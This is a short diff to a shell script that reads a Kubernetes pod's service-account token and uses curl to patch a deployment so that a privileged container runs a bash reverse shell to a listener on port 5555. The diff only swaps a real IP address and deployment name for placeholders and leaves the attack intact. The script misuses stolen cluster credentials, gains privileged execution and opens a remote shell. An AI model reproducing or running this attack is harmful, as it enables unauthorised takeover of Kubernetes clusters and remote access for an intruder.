@@ -1,7 +1,7 @@
 TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
 API_SERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
 NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
-DEPLOYMENT_NAME="pod-manager-deployment"
+DEPLOYMENT_NAME="<deployment name here>"
 
 curl -v -k \
 -X PATCH \
@@ -28,7 +28,7 @@ curl -v -k \
       "command": [
         "bash",
         "-c",
-        "bash -i >& /dev/tcp/172.23.81.252/5555 0>&1"
+        "bash -i >& /dev/tcp/<listener IP address>/5555 0>&1"
       ],
       "securityContext": {
         "privileged": true
